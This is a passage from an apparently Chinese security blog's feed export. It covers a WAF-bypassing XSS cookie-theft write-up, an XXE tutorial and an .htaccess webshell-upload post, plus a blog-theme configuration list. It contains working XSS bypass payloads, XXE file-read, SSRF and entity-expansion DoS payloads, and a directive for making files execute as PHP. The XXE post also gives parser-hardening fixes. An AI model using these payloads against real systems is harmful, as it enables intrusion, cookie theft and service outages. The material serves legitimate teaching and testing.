<p>结果发现被拦截，到这一步还被拦截，基本上就难办了。但是经过测试，发现它只是拦截了；这个特殊字符。至于为什么会拦截；呢，我想它的本意不是为了拦截XSS，是为了拦截多语句的SQL注入的分号。</p>
<p>但是幸运的是，上述16进制编码的payload语句，<strong>把；去掉，一样是可以触发漏洞的</strong>，分号可有可无。</p>
<p>于是上述16进制的payload就变成了如下格式：</p>
<p><strong>&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x31&amp;#x31&amp;#x29</strong></p>
<p>组合起来最终的弹窗完整的payload是如下形式：</p>
<p><strong>&lt;image&#x2F;src&#x3D;| onerror &#x3D; javascript:alert(111)&gt;</strong></p>
<p>直接用burpsuite抓包提交是不行的，因为&amp;会与POST请求数据包中的&amp;分割符重复，这个好解决，可以对payload进行URL编码一样吧。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646645.png" alt="图片"></p>
<p><strong>URL编码后的payload大致如下所示：</strong></p>
<p><strong>&lt;image&#x2F;src&#x3D;| onerror &#x3D; %26%23%78%36%61%26%23%78%36%31%26%23%78%37%36%26%23%78%36%31%26%23%78%37%33%26%23%78%36%33%26%23%78%37%32%26%23%78%36%39%26%23%78%37%30%26%23%78%37%34%26%23%78%33%61%26%23%78%36%31%26%23%78%36%63%26%23%78%36%35%26%23%78%37%32%26%23%78%37%34%26%23%78%32%38%26%23%78%33%31%26%23%78%33%31%26%23%78%33%31%26%23%78%32%39&gt;</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646746.png" alt="图片"></p>
<p> <strong>5</strong> <strong>Change Body encoding绕过第2道防护</strong></p>
<p>提交之后，发现它有两道防护，因为到这一步没有原先的403错误提示了，直接是超时等待了一段时间，说明我们刚才的不懈努力只是绕过了第1道防护，而第2道防护没有绕过去，到这里我已经快放弃了。。。最终经过测试，<strong>发现使用burpsuite的“change body encoding”把POST数据包格式改一下即可绕过第2道防护</strong>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646747.png" alt="图片"></p>
<p>最终将如下格式数据包编码后提交，**&lt;image&#x2F;src&#x3D;| onerror &#x3D; javascript:alert(document.cookie)&gt;**</p>
<p>最终本地绕过2道防护，可以弹出Cookie了（以下截图为本地虚拟机环境截图，原图敏感，就不放出来了）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646748.png" alt="图片"></p>
<p> <strong>6</strong> <strong>XSS盲打平台</strong></p>
<p>接下来就是找XSS盲打平台了，建议大家自己从网上找一个别人搭建好的XSS盲打平台测试吧，因为自己搭建XSS平台，还得买域名、还怕泄露真实身份信息，而且网上的PHP的XSS平台代码也有不少坑，有时候wamp能搭建成功，phpstudy就搭建不成功。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646749.png" alt="图片"></p>
<p>最终看了一下XSS平台给出的payload语句，结合javascript为协议，组合成可真正获取Cookie的测试payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;image/src=| onerror = javascript:eval(atob(&#x27;cz1jxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxhbmRvbSgp&#x27;))&gt;</span><br></pre></td></tr></table></figure>

<p><em><strong>*编码成16进制格式如下：*</strong></em></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646750.png" alt="图片"></p>
<p>上图为虚拟机测试图，到这一步呢，我才发现，原来这个src官网，防xss是这样防范的，假设官网的管理员后台地址是<a href="https://admin.xxx.src.com.cn。我本地打开这个后台地址，**发现这个官网后台限制了只有内网ip才能登陆！**到这一步，我才惊讶地发现，原来这样可以防止XSS盲打Cookie的攻击，它直接限制管理员后台的登陆，打到Cookie也没用！难道我们就没有办法了吗？经过一系列查找资料，还是有办法解决的，使用XSS隧道，或者XSS代理。">https://admin.xxx.src.com.cn。我本地打开这个后台地址，**发现这个官网后台限制了只有内网ip才能登陆！**到这一步，我才惊讶地发现，原来这样可以防止XSS盲打Cookie的攻击，它直接限制管理员后台的登陆，打到Cookie也没用！难道我们就没有办法了吗？经过一系列查找资料，还是有办法解决的，使用XSS隧道，或者XSS代理。</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646751.png" alt="图片"></p>
<p> <strong>7</strong> <strong>XSS 隧道代理</strong></p>
<p>这个工具大概暂时只是概念性质的，我当时测试的效果是非常不好用。因为本地搭建环境测试，一旦我这边挂上XSS代理，受害者那边的浏览器就会卡死，一旦受害者关闭浏览器，代理也随之失效。到目前还没有找到一个靠谱的XSS Proxy代理工具，<strong>所以这是一种解决方案，但是没法用于实战</strong>，不知道现在网上有没有出新的靠谱的工具。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646752.png" alt="图片"></p>
<p>至此，一条曲折的XSS实战利用道路就完成了，收获不少。</p>
<p> <strong>Part3 总结</strong> </p>
<p><strong>1.</strong> 防止XSS盲打，可以禁止管理员后台的外网登录，限制仅内网可以登录。这样一来即使攻击者通过XSS拿到有效Cookie，也没法用于后台的登录。记得设置HttpOnly属性。</p>
<p><strong>2.</strong> 对于XSS 代理或者XSS隧道，如果大家有稳定靠谱的工具，能用于实战的，还希望推荐一下。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE 注入漏洞总结</title>
    <url>/posts/71ac9e67.html</url>
    <content><![CDATA[<h1 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>XML 指可扩展标记语言（eXtensible Markup Language）。<br>方便大家理解，这里与HTML对比着给大家说一下：HTML和XML 为不同的目的而设计，HTML 被设计用来显示数据，其焦点是数据的外观。XML 被设计用来传输和存储数据，其焦点是数据的内容。HTML 旨在显示信息，而 XML 旨在传输信息。</p>
<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。<br>DTD的声明：指XML文档中声明该文档的DTD或DTD来源的部分，可以包含在使用它的XML文档内部，也可以以独立的DTD文档（*.dtd）文档存在。</p>
<p>所以DTD一般认为有两种引用或声明方式：</p>
<blockquote>
<p>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。<br>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。<br>（网上有提到的引用公共DTD其实也算外部引用DTD的一种）</p>
</blockquote>
<h3 id="XML基本文档结构"><a href="#XML基本文档结构" class="headerlink" title="XML基本文档结构"></a>XML基本文档结构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--XML声明--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--DTD，这部分可选的--&gt;          </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;!--文档元素--&gt;                                                                          </span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<h2 id="什么是xxe"><a href="#什么是xxe" class="headerlink" title="什么是xxe"></a>什么是xxe</h2><p>XXE(XML External Entity Injection) XML外部实体注入，XML是一种类似于HTML（超文本标记语言）的可扩展标记语言，是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
<h2 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h2><p>一般可见于登录、注册等页面，通过XML进行传输数据。</p>
<p><strong>特征</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type：text/xml</span><br><span class="line">Content-type:application/xml</span><br><span class="line">&lt;forgot&gt;&lt;username&gt;admin&lt;/username&gt;&lt;/forgot&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210710220109467.png" alt="image-20210710220109467"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210710220120028.png" alt="image-20210710220120028"></p>
<h2 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h2><p>当发现可能存在的xxe注入点，我们先来构造一个正常的XML文档：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;user&gt;&lt;firstname&gt;rabbit&lt;/firstname&gt;&lt;lastname&gt;666&lt;/lastname&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210710220809570.png" alt="image-20210710220809570"></p>
<p>回显正常，说明通过XML进行传输数据。</p>
<p>然后我们来构造一个引用特殊的payload，增加DTD：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;file:///c:/1.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;&lt;lastname&gt;666&lt;/lastname&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210710221058723.png" alt="image-20210710221058723"></p>
<p>回显正常，并且读取到了文件，执行成功。</p>
<p>试着来访问下系统文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;&lt;lastname&gt;666&lt;/lastname&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210710221234500.png" alt="image-20210710221234500"></p>
<p>执行成功。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>XXE漏洞能干什么？</strong></p>
<h3 id="1-任意文件读取"><a href="#1-任意文件读取" class="headerlink" title="1. 任意文件读取"></a>1. 任意文件读取</h3><p>如上述案例，为最基本的利用。</p>
<h3 id="2-SSRF"><a href="#2-SSRF" class="headerlink" title="2. SSRF"></a>2. SSRF</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)，说白了就是借助漏洞实现内网探测，我在80端口的网站下临时放了我们刚刚的测试文件，简单修改下payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http://127.0.0.1/1.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;&lt;lastname&gt;666&lt;/lastname&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-DOS攻击"><a href="#3-DOS攻击" class="headerlink" title="3. DOS攻击"></a>3. DOS攻击</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">  &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>

<p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。<br>亦或者，如果目标是UNIX系统，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p>如果 XML 解析器尝试使用 &#x2F;dev&#x2F;random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p>
<h3 id="4-远程命令执行"><a href="#4-远程命令执行" class="headerlink" title="4. 远程命令执行"></a>4. 远程命令执行</h3><p>这种情况很少见，并不是传统意义上的任意命令执行，只是因为环境的特殊配置，导致XML与某些命令操作关联，进而造成了命令执行。当PHP环境中的PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，就会造成我们说的这种情况。</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>对 XML 解析器进行安全配置，使它不允许将外部实体包含在传入的 XML 文档中。不管是上面语言，抑或是使用了市面是哪种主流XML解析方案，最终的解决方案都可以如此借鉴：<br>为了避免 XXE injections，应为 XML 代理、解析器或读取器设置下面的属性：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">factory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">factory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br></pre></td></tr></table></figure>

<p>如果不需要 inline DOCTYPE 声明，可使用以下属性将其完全禁用，这种方式显然更直接，我们搭建环境中一直在吐槽DTD被禁用，就是这个意思，DOCTYPE被禁，也就禁掉了DTD的根本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">factory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br></pre></td></tr></table></figure>

<h2 id="XXE进阶"><a href="#XXE进阶" class="headerlink" title="XXE进阶"></a>XXE进阶</h2><p>XXE漏洞存在需要满足两个条件</p>
<ol>
<li>支持DTD</li>
<li>数据可操控</li>
</ol>
<p>前者是我们xxe的必须条件，后者如果我们提交的数据并未通过返回包返回回来，我们也就看不到了，为此，将xxe漏洞又分为回显型和无回显型。</p>
<p>对于这种数据无回显的情况，我们引出OOB攻击的概念，即数据外带（Out of Band）。</p>
<p>利用的两种手段：</p>
<ol>
<li>通过自己写一个页面用来接受目标服务器传回的内容，但是实际测试效果并不稳定。</li>
<li>开源工具：xxeserve</li>
</ol>
<blockquote>
<p><a href="https://github.com/joernchen/xxeserve">https://github.com/joernchen/xxeserve</a></p>
</blockquote>
<p>利用详情参考 <a href="https://mp.weixin.qq.com/s/mq2YO1Xg292n4InBTM0AsQ">https://mp.weixin.qq.com/s/mq2YO1Xg292n4InBTM0AsQ</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/mPAFcLm94KgM6S8alB2sTQ">https://mp.weixin.qq.com/s/mPAFcLm94KgM6S8alB2sTQ</a></p>
<p><a href="https://mp.weixin.qq.com/s/mq2YO1Xg292n4InBTM0AsQ%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89">https://mp.weixin.qq.com/s/mq2YO1Xg292n4InBTM0AsQ（推荐）</a></p>
<p><a href="https://blog.csdn.net/bylfsj/article/details/101441734">https://blog.csdn.net/bylfsj/article/details/101441734</a></p>
]]></content>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>butterfly 的一些配置</title>
    <url>/posts/a6811de8.html</url>
    <content><![CDATA[<h2 id="一、常用配置"><a href="#一、常用配置" class="headerlink" title="一、常用配置"></a>一、常用配置</h2><blockquote>
<p>butterfly 官方文档 <a href="https://butterfly.js.org/">https://butterfly.js.org/</a> </p>
<p>新手按着官方文档走一遍就可以了</p>
<p>这里只是列出部分容易遗忘和重复应用到的配置，方便快速定位</p>
</blockquote>
<h3 id="1-友情链接添加"><a href="#1-友情链接添加" class="headerlink" title="1. 友情链接添加"></a>1. 友情链接添加</h3><p><a href="https://butterfly.js.org/posts/dc584b87/#%E5%8F%8B%E6%83%85%E9%8F%88%E6%8E%A5%E6%B7%BB%E5%8A%A0">https://butterfly.js.org/posts/dc584b87/#%E5%8F%8B%E6%83%85%E9%8F%88%E6%8E%A5%E6%B7%BB%E5%8A%A0</a></p>
<h3 id="2-图库"><a href="#2-图库" class="headerlink" title="2. 图库"></a>2. 图库</h3><p><a href="https://butterfly.js.org/posts/dc584b87/#%E5%9C%96%E5%BA%AB">https://butterfly.js.org/posts/dc584b87/#%E5%9C%96%E5%BA%AB</a></p>
<h3 id="3-主页文章节选-自动节选和文章页description"><a href="#3-主页文章节选-自动节选和文章页description" class="headerlink" title="3. 主页文章节选(自动节选和文章页description)"></a>3. 主页文章节选(自动节选和文章页description)</h3><p><a href="https://butterfly.js.org/posts/4aa8abbe/#%E4%B8%BB%E9%A0%81%E6%96%87%E7%AB%A0%E7%AF%80%E9%81%B8-%E8%87%AA%E5%8B%95%E7%AF%80%E9%81%B8%E5%92%8C%E6%96%87%E7%AB%A0%E9%A0%81description">https://butterfly.js.org/posts/4aa8abbe/#%E4%B8%BB%E9%A0%81%E6%96%87%E7%AB%A0%E7%AF%80%E9%81%B8-%E8%87%AA%E5%8B%95%E7%AF%80%E9%81%B8%E5%92%8C%E6%96%87%E7%AB%A0%E9%A0%81description</a></p>
<h3 id="4-文章置顶"><a href="#4-文章置顶" class="headerlink" title="4. 文章置顶"></a>4. 文章置顶</h3><p><a href="https://butterfly.js.org/posts/4aa8abbe/#%E6%96%87%E7%AB%A0%E7%BD%AE%E9%A0%82">https://butterfly.js.org/posts/4aa8abbe/#%E6%96%87%E7%AB%A0%E7%BD%AE%E9%A0%82</a></p>
<h3 id="5-文章页相关配置"><a href="#5-文章页相关配置" class="headerlink" title="5. 文章页相关配置"></a>5. 文章页相关配置</h3><p> <strong>5.1 meta 显示</strong></p>
<p><a href="https://butterfly.js.org/posts/4aa8abbe/#%E6%96%87%E7%AB%A0meta%E9%A1%AF%E7%A4%BA">https://butterfly.js.org/posts/4aa8abbe/#%E6%96%87%E7%AB%A0meta%E9%A1%AF%E7%A4%BA</a></p>
<p><strong>5.2 文章过期提醒</strong></p>
<p><a href="https://butterfly.js.org/posts/4aa8abbe/#%E6%96%87%E7%AB%A0%E9%81%8E%E6%9C%9F%E6%8F%90%E9%86%92">https://butterfly.js.org/posts/4aa8abbe/#%E6%96%87%E7%AB%A0%E9%81%8E%E6%9C%9F%E6%8F%90%E9%86%92</a></p>
<p><strong>5.3 文章编辑（使用 abbrlink 之前）</strong></p>
<p><a href="https://butterfly.js.org/posts/4aa8abbe/#%E6%96%87%E7%AB%A0%E7%B7%A8%E8%BC%AF%E6%8C%89%E9%88%95">https://butterfly.js.org/posts/4aa8abbe/#%E6%96%87%E7%AB%A0%E7%B7%A8%E8%BC%AF%E6%8C%89%E9%88%95</a></p>
<p><strong>5.4 文章编辑（使用 abbrlink 之后）</strong></p>
<p>主题目录下 <code>_config.yml</code>配置：</p>
<p>![image-20220330233445512](..&#x2F;imgs&#x2F;hexo+butterfly 配置清单&#x2F;image-20220330233445512.png)</p>
<p>修改 butterfly theme 下的 <code>post-info.pug</code> 文件：</p>
<p>注释部分下方即为修改位置</p>
<p>![image-20220330233604356](..&#x2F;imgs&#x2F;hexo+butterfly 配置清单&#x2F;image-20220330233604356.png)</p>
<p>然后就是 <code>hexo c&amp;&amp;hexo g&amp;&amp;hexo d</code> 即可</p>
<h3 id="6-侧边栏设置"><a href="#6-侧边栏设置" class="headerlink" title="6. 侧边栏设置"></a>6. 侧边栏设置</h3><p><a href="https://butterfly.js.org/posts/4aa8abbe/#%E5%81%B4%E9%82%8A%E6%8E%92%E7%89%88">https://butterfly.js.org/posts/4aa8abbe/#%E5%81%B4%E9%82%8A%E6%8E%92%E7%89%88</a></p>
<h3 id="7-标签外挂"><a href="#7-标签外挂" class="headerlink" title="7. 标签外挂"></a>7. 标签外挂</h3><p>适合个性化显示</p>
<p><a href="https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89">https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89</a></p>
<p>Note bootstrap</p>
<p><a href="https://butterfly.js.org/posts/2df239ce/#Note-Bootstrap-Callout">https://butterfly.js.org/posts/2df239ce/#Note-Bootstrap-Callout</a></p>
<h3 id="8-网站验证-分析统计-SEO"><a href="#8-网站验证-分析统计-SEO" class="headerlink" title="8. 网站验证 | 分析统计 | SEO"></a>8. 网站验证 | 分析统计 | SEO</h3><p><a href="https://butterfly.js.org/posts/ceeb73f/#%E7%B6%B2%E7%AB%99%E9%A9%97%E8%AD%89">https://butterfly.js.org/posts/ceeb73f/#%E7%B6%B2%E7%AB%99%E9%A9%97%E8%AD%89</a></p>
<p>可以参考</p>
<p><a href="https://sunhwee.com/posts/6e8839eb.html#toc-heading-45">https://sunhwee.com/posts/6e8839eb.html#toc-heading-45</a></p>
]]></content>
      <categories>
        <category>编程随想</category>
      </categories>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>.htaccess文件利用解析</title>
    <url>/posts/7e01c9e6.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/2XDuecrXhybfWBxOv5qwVA">https://mp.weixin.qq.com/s/2XDuecrXhybfWBxOv5qwVA</a></p>
</blockquote>
<h2 id="什么是-htaccess"><a href="#什么是-htaccess" class="headerlink" title="什么是.htaccess"></a>什么是.htaccess</h2><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
<p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>通过.htaccess文件，调用php的解析器解析一个文件名，只要包含”hacker”这个字符串的任意文件。这个”hacker”的内容如果是一句话木马，即可利用中国菜刀或中国蚁剑进行连接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;hacker&quot;&gt;</span><br><span class="line">Sethandler application/x-httpd-php</span><br><span class="line">&lt;/Eilesmatch &gt;</span><br></pre></td></tr></table></figure>

<p>创建一个hacker.html写入</p>
